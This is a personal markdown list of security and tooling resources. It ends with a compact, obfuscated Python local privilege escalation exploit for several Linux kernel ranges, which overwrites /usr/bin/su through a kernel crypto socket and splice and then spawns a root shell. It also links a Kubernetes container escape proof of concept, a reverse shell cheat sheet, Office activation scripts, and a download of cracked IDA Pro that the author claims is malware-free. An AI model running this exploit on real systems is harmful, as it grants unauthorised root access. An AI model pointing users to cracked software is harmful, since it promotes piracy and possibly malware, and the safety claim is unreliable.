# R3sources
A collection of interesting resources I thought might be useful next time.

## Learning Resources
1. [how2heap github repo](https://github.com/shellphish/how2heap)
    - Super informative repo for heap exploitation techniques.
## Useful Blogposts
1. [pentestmonkey Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    - Great reverse shell commands

## Licence Keys/ Activating Products
1. [Massgrave](https://massgrave.dev/)
    - Site that provides scripts to activate Microsoft Office.
2. [Cracked IDA-Pro](https://drive.usercontent.google.com/download?id=1X7ZJP-7L_NqR8Hm3sjpnjLPnM3YldHDQ)
    - [Setup Guide](https://bbs.kanxue.com/thread-282846.htm) in Chinese.
    - Works on M series Macs and Windows (haven't tested on Linux).
    - Checked the signature, no malware.

## Useful Online Tools
1. [OCR2edit](https://www.ocr2edit.com)
    - Convert scanned PDFs to .txt outputs.
    - Can use this and github copilot to clean up texts.
2. [cyberchef](https://gchq.github.io/CyberChef/)
    - Great tool for encoding/decoding, encryption/decryption, and other data manipulation tasks.

## Reverse Engineering resources
### x86 Assembly
    - [x86 Instruction Set Reference](https://www.felixcloutier.com/x86/)
    - [x86 Opcode and Instruction Reference](https://ref.x86asm.net/coder32.html)
### MSDN
    - [MSDN x86 Assembly Reference](https://docs.microsoft.com/en-us/cpp/assembler/masm/microsoft-macro-assembler-reference?view=msvc-170)

    

## Some useful CVEs
### LPEs 
#### [Copyfail](https://copyfail.com)
> lightweight 732 byte LPE exploit for Linux kernel 5.8-5.10.17, 5.11-5.11.11, 5.12-5.12.9, 5.13-5.13.12, 5.14-5.14.6, and 5.15-5.15.25
```
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```
#### [Copyfail K container escape]
> adapted from copyfail, allows unprivileged containers to achieve node level code execution on kubernetes
Github repo: [here](https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC)


